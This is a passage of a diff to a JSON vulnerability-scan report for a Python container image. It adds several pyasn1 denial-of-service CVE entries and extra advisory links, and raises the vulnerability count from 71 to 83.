+            "https://github.com/pyasn1/pyasn1/security/advisories/GHSA-fm9c-5rcf-2q5p",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-119194",
+            "https://www.cve.org/CVERecord?id=CVE-2026-119194"
+          ],
+          "PublishedDate": "2026-10-29T20:17:30.48Z",
+          "LastModifiedDate": "2026-10-30T17:18:03.88Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-119195",
+          "VendorIDs": [
+            "GHSA-9m75-vc3g-4x39"
+          ],
+          "PkgName": "pyasn1",
+          "PkgPath": "usr/local/lib/python3.7/site-packages/pyasn1-0.4.8.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pyasn1@0.4.8",
+            "UID": "f656d1b01a8f28fb"
+          },
+          "InstalledVersion": "0.4.8",
+          "FixedVersion": "0.6.5",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:0cb5355ba37933c73fd8950476d33131a09b49ff34f16506b2d1d68ac473304b",
+            "DiffID": "sha256:dc0e076fbc49ff783c909261129dee2a1bb33712c8969fff7b3829c679611ac1"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-119195",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:9f87f5e5aabc963214ba35532b491e7d5a0a366e926da8845356a0db5d508cd2",
+          "Title": "pyasn1: pyasn1: Denial of Service via quadratic processing of fragmented ASN.1 data",
+          "Description": "pyasn1 is a generic ASN.1 library for Python. Prior to 0.6.5, constructed string and indefinite-length ANY decoding repeatedly concatenates each fragment onto a growing bytes value. Attacker-controlled BER or CER data can use many constructed OCTET STRING or character-string fragments. DER rejects constructed OCTET STRING without a schema, but accepts its definite-length form when asn1Spec selects univ.OctetString; it also accepts constructed character strings such as UTF8String without a schema, even though those encodings are not valid DER. The separate indefinite-length ANY path is reachable in BER and CER when asn1Spec selects univ.Any; DER rejects indefinite lengths. OctetStringPayloadDecoder uses growing header concatenation and AnyPayloadDecoder.indefLenValueDecoder uses growing chunk concatenation, repeatedly copying an increasing prefix and causing quadratic work. A sufficiently fragmented value can occupy decoding workers and cause CPU exhaustion without confidentiality or integrity impact. This issue is fixed in version 0.6.5.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-407"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-119195",
+            "https://advisory.echohq.com/cve/CVE-2026-119195",
+            "https://github.com/pyasn1/pyasn1",
+            "https://github.com/pyasn1/pyasn1/commit/4ce00797c594b59c1fd6b86d9ebc3ba87b7ec9f9",
+            "https://github.com/pyasn1/pyasn1/pull/132",
+            "https://github.com/pyasn1/pyasn1/releases/tag/v0.6.5",
+            "https://github.com/pyasn1/pyasn1/security/advisories/GHSA-9m75-vc3g-4x39",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-119195",
+            "https://www.cve.org/CVERecord?id=CVE-2026-119195"
+          ],
+          "PublishedDate": "2026-10-29T20:17:30.633Z",
+          "LastModifiedDate": "2026-10-30T17:18:03.88Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-119196",
+          "VendorIDs": [
+            "GHSA-2qm8-x737-gmw5"
+          ],
+          "PkgName": "pyasn1",
+          "PkgPath": "usr/local/lib/python3.7/site-packages/pyasn1-0.4.8.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pyasn1@0.4.8",
+            "UID": "f656d1b01a8f28fb"
+          },
+          "InstalledVersion": "0.4.8",
+          "FixedVersion": "0.6.5",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:0cb5355ba37933c73fd8950476d33131a09b49ff34f16506b2d1d68ac473304b",
+            "DiffID": "sha256:dc0e076fbc49ff783c909261129dee2a1bb33712c8969fff7b3829c679611ac1"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-119196",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:189b00982c10902d81b6b06dcc61cd17ba22a09bc639b6fdb3b440c67088db83",
+          "Title": "pyasn1: pyasn1: Denial of Service via constructed bit string decoding",
+          "Description": "pyasn1 is a generic ASN.1 library for Python. Prior to 0.6.5, constructed BIT STRING decoding repeatedly shifts and copies the complete bit value accumulated from earlier fragments. Attacker-controlled BER or CER input contains many constructed BIT STRING fragments; schema-driven DER also accepts a definite-length constructed BIT STRING. BitStringPayloadDecoder repeatedly calls BitString.fromOctetString with the prior bitString as prepend, shifting an ever-growing SizedInteger for each fragment and causing quadratic work. Large fragmented values can exhaust CPU during decode() without requiring later conversion or formatting. This issue is fixed in version 0.6.5.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-407"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-119196",
+            "https://advisory.echohq.com/cve/CVE-2026-119196",
+            "https://github.com/pyasn1/pyasn1",
+            "https://github.com/pyasn1/pyasn1/commit/73ba7b043cc7e92cb37f16f2c955bff93b0e6f6c",
+            "https://github.com/pyasn1/pyasn1/pull/132",
+            "https://github.com/pyasn1/pyasn1/releases/tag/v0.6.5",
+            "https://github.com/pyasn1/pyasn1/security/advisories/GHSA-2qm8-x737-gmw5",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-119196",
+            "https://www.cve.org/CVERecord?id=CVE-2026-119196"
+          ],
+          "PublishedDate": "2026-10-29T20:17:30.77Z",
+          "LastModifiedDate": "2026-10-30T17:18:03.88Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-119197",
+          "VendorIDs": [
+            "GHSA-mm57-4v3p-rchx"
+          ],
+          "PkgName": "pyasn1",
+          "PkgPath": "usr/local/lib/python3.7/site-packages/pyasn1-0.4.8.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pyasn1@0.4.8",
+            "UID": "f656d1b01a8f28fb"
+          },
+          "InstalledVersion": "0.4.8",
+          "FixedVersion": "0.6.5",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:0cb5355ba37933c73fd8950476d33131a09b49ff34f16506b2d1d68ac473304b",
+            "DiffID": "sha256:dc0e076fbc49ff783c909261129dee2a1bb33712c8969fff7b3829c679611ac1"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-119197",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:9c31692b66b4169fd2abc6a91b45370d0a17519329aab2ff954e52eb9c08b8a7",
+          "Title": "pyasn1: pyasn1: Denial of Service via quadratic complexity in binary REAL decoding",
+          "Description": "pyasn1 is a generic ASN.1 library for Python. Prior to 0.6.5, binary REAL decoding builds a large mantissa one octet at a time by shifting a growing integer and slicing the remaining byte string. Attacker-controlled ASN.1 includes a binary-encoded REAL with a large mantissa and reaches BER, CER, or DER decode(), with or without a schema containing REAL. RealPayloadDecoder.valueDecoder repeatedly performs a left shift, OR, and suffix copy for every mantissa octet, making decode time quadratic in mantissa length. A comparatively small REAL value can hold a decoding worker on one CPU core for seconds or longer and cause availability loss. This issue is fixed in version 0.6.5.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-407"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-119197",
+            "https://advisory.echohq.com/cve/CVE-2026-119197",
+            "https://github.com/pyasn1/pyasn1",
+            "https://github.com/pyasn1/pyasn1/commit/ce3ec3390784780a530047e0e77be5ff457636a4",
+            "https://github.com/pyasn1/pyasn1/pull/132",
+            "https://github.com/pyasn1/pyasn1/releases/tag/v0.6.5",
+            "https://github.com/pyasn1/pyasn1/security/advisories/GHSA-mm57-4v3p-rchx",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-119197",
+            "https://www.cve.org/CVERecord?id=CVE-2026-119197"
+          ],
+          "PublishedDate": "2026-10-29T20:17:30.907Z",
+          "LastModifiedDate": "2026-10-30T17:18:03.88Z"
         },
         {
           "VulnerabilityID": "CVE-2026-30922",
@@ -3840,6 +4618,7 @@
             "https://access.redhat.com/errata/RHSA-2026:6926",
             "https://access.redhat.com/errata/RHSA-2026:8437",
             "https://access.redhat.com/security/cve/CVE-2026-30922",
+            "https://advisory.echohq.com/cve/CVE-2026-30922",
             "https://bugzilla.redhat.com/2448553",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2447194",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2448553",
@@ -3918,6 +4697,7 @@
           },
           "References": [
             "https://access.redhat.com/security/cve/CVE-2026-59884",
+            "https://advisory.echohq.com/cve/CVE-2026-59884",
             "https://github.com/pyasn1/pyasn1",
             "https://github.com/pyasn1/pyasn1/commit/628e36ecbb5277a3f01572ce418ef54271b165a5",
             "https://github.com/pyasn1/pyasn1/releases/tag/v0.6.4",
@@ -3983,6 +4763,7 @@
           },
           "References": [
             "https://access.redhat.com/security/cve/CVE-2026-59885",
+            "https://advisory.echohq.com/cve/CVE-2026-59885",
             "https://github.com/pyasn1/pyasn1",
             "https://github.com/pyasn1/pyasn1/commit/45bdb19eb7df4b3780fe9c912c63e99bffc39dd9",
             "https://github.com/pyasn1/pyasn1/releases/tag/v0.6.4",
@@ -4051,6 +4832,7 @@
             "https://access.redhat.com/errata/RHSA-2026:59242",
             "https://access.redhat.com/errata/RHSA-2026:59243",
             "https://access.redhat.com/security/cve/CVE-2026-59886",
+            "https://advisory.echohq.com/cve/CVE-2026-59886",
             "https://bugzilla.redhat.com/2500041",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2500041",
             "https://creativecommons.org/licenses/by/4.0/",
@@ -4377,6 +5159,7 @@
           "References": [
             "https://access.redhat.com/errata/RHSA-2024:6726",
             "https://access.redhat.com/security/cve/CVE-2024-6345",
+            "https://advisory.echohq.com/cve/CVE-2024-6345",
             "https://bugzilla.redhat.com/2297771",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2297771",
             "https://creativecommons.org/licenses/by/4.0/",
@@ -4465,6 +5248,7 @@
             "https://access.redhat.com/errata/RHSA-2025:13578",
             "https://access.redhat.com/errata/RHSA-2025:9940",
             "https://access.redhat.com/security/cve/CVE-2025-47273",
+            "https://advisory.echohq.com/cve/CVE-2025-47273",
             "https://bugzilla.redhat.com/2366982",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2366982",
             "https://creativecommons.org/licenses/by/4.0/",
@@ -4763,6 +5547,7 @@
             "https://access.redhat.com/errata/RHSA-2026:1086",
             "https://access.redhat.com/errata/RHSA-2026:1239",
             "https://access.redhat.com/security/cve/CVE-2025-66418",
+            "https://advisory.echohq.com/cve/CVE-2025-66418",
             "https://bugzilla.redhat.com/2419455",
             "https://bugzilla.redhat.com/2419467",
             "https://bugzilla.redhat.com/2427726",
@@ -4853,6 +5638,7 @@
             "https://access.redhat.com/errata/RHSA-2026:1086",
             "https://access.redhat.com/errata/RHSA-2026:1239",
             "https://access.redhat.com/security/cve/CVE-2025-66471",
+            "https://advisory.echohq.com/cve/CVE-2025-66471",
             "https://bugzilla.redhat.com/2419455",
             "https://bugzilla.redhat.com/2419467",
             "https://bugzilla.redhat.com/2427726",
@@ -5062,6 +5848,7 @@
             "https://access.redhat.com/errata/RHSA-2026:8500",
             "https://access.redhat.com/errata/RHSA-2026:8501",
             "https://access.redhat.com/security/cve/CVE-2026-21441",
+            "https://advisory.echohq.com/cve/CVE-2026-21441",
             "https://bugzilla.redhat.com/2419455",
             "https://bugzilla.redhat.com/2419467",
             "https://bugzilla.redhat.com/2427726",
@@ -5153,6 +5940,7 @@
             "https://access.redhat.com/errata/RHSA-2026:28000",
             "https://access.redhat.com/errata/RHSA-2026:28159",
             "https://access.redhat.com/security/cve/CVE-2026-44431",
+            "https://advisory.echohq.com/cve/CVE-2026-44431",
             "https://bugzilla.redhat.com/2477154",
             "https://bugzilla.redhat.com/2477167",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2477154",
@@ -5208,13 +5996,24 @@
             "CWE-770"
           ],
           "VendorSeverity": {
+            "alma": 3,
+            "amazon": 3,
+            "azure": 3,
             "ghsa": 3,
-            "redhat": 3
+            "nvd": 3,
+            "oracle-oval": 3,
+            "redhat": 3,
+            "rocky": 3,
+            "ubuntu": 2
           },
           "CVSS": {
             "ghsa": {
               "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H",
               "V40Score": 8.9
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
             },
             "redhat": {
               "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
@@ -5222,16 +6021,31 @@
             }
           },
           "References": [
+            "https://access.redhat.com/errata/RHSA-2026:84578",
+            "https://access.redhat.com/errata/RHSA-2026:90494",
             "https://access.redhat.com/security/cve/CVE-2026-97689",
+            "https://advisory.echohq.com/cve/CVE-2026-97689",
+            "https://bugzilla.redhat.com/2543245",
+            "https://bugzilla.redhat.com/2543255",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2543245",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2543255",
+            "https://creativecommons.org/licenses/by/4.0/",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-97687",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-97689",
+            "https://errata.almalinux.org/9/ALSA-2026-90494.html",
+            "https://errata.rockylinux.org/RLSA-2026:84578",
             "https://github.com/urllib3/urllib3",
             "https://github.com/urllib3/urllib3/commit/cd770b059b543be29298ea5c52afb0b1b090f5ed",
             "https://github.com/urllib3/urllib3/releases/tag/2.8.0",
             "https://github.com/urllib3/urllib3/security/advisories/GHSA-vxq7-64xx-v4gw",
+            "https://linux.oracle.com/cve/CVE-2026-97689.html",
+            "https://linux.oracle.com/errata/ELSA-2026-92474.html",
             "https://nvd.nist.gov/vuln/detail/CVE-2026-97689",
+            "https://ubuntu.com/security/notices/USN-8926-1",
             "https://www.cve.org/CVERecord?id=CVE-2026-97689"
           ],
           "PublishedDate": "2026-09-29T16:17:18.837Z",
-          "LastModifiedDate": "2026-09-30T19:38:27.293Z"
+          "LastModifiedDate": "2026-10-13T20:20:06.95Z"
         },
         {
           "VulnerabilityID": "CVE-2022-40898",
@@ -5318,11 +6132,11 @@
           "LastModifiedDate": "2026-06-17T05:02:13.177Z"
         }
       ],
-      "vulnerability_count": 71
+      "vulnerability_count": 83
     }
   },
   "summary": {
     "total_versions_scanned": 1,
-    "total_vulnerabilities": 71
+    "total_vulnerabilities": 83
   }
 }
